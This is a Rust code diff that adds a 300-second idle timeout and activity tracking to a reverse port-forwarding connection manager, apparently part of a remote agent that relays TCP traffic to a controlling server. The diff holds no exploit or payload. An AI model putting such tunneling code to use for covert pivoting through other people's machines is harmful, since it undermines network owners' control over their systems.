@@ -13,6 +13,7 @@ use crate::streams::StreamDriver;
 const MAX_CONNECTIONS: usize = 128;
 const MAX_READ_PER_CONN: usize = 32 * 1024;
 const MAX_PENDING_WRITE_BYTES: usize = 1024 * 1024;
+const CONNECTION_IDLE_TIMEOUT: Duration = Duration::from_secs(300);
 
 struct RpfwdListener {
     listener: TcpListener,
@@ -22,6 +23,7 @@ struct RpfwdConnection {
     stream: TcpStream,
     port: u32,
     pending_writes: VecDeque<Vec<u8>>,
+    last_activity: Instant,
 }
 
 #[derive(Debug, Deserialize)]
@@ -160,6 +162,7 @@ impl RpfwdManager {
                 return;
             }
             connection.pending_writes.push_back(decoded);
+            connection.last_activity = Instant::now();
             if flush_pending_writes(connection).is_err() {
                 self.close(message.server_id, true);
             }
@@ -192,6 +195,7 @@ impl RpfwdManager {
                                     stream,
                                     port: port as u32,
                                     pending_writes: VecDeque::new(),
+                                    last_activity: Instant::now(),
                                 },
                             );
                             self.queue_data(server_id, Some(port as u32), &[], false);
@@ -210,6 +214,9 @@ impl RpfwdManager {
         for id in ids {
             let mut close = false;
             if let Some(connection) = self.connections.get_mut(&id) {
+                if connection.last_activity.elapsed() >= CONNECTION_IDLE_TIMEOUT {
+                    close = true;
+                }
                 if flush_pending_writes(connection).is_err() {
                     close = true;
                 }
@@ -231,6 +238,9 @@ impl RpfwdManager {
                         break;
                     }
                     Ok(n) => {
+                        if let Some(connection) = self.connections.get_mut(&id) {
+                            connection.last_activity = Instant::now();
+                        }
                         let port = self.connections.get(&id).map(|conn| conn.port);
                         self.queue_data(id, port, &buf[..n], false);
                         if n < MAX_READ_PER_CONN {
@@ -329,6 +339,7 @@ fn flush_pending_writes(connection: &mut RpfwdConnection) -> io::Result<()> {
                 }
                 Ok(n) => {
                     data.drain(..n);
+                    connection.last_activity = Instant::now();
                 }
                 Err(e) if e.kind() == io::ErrorKind::WouldBlock => {
                     connection.pending_writes.push_front(data);
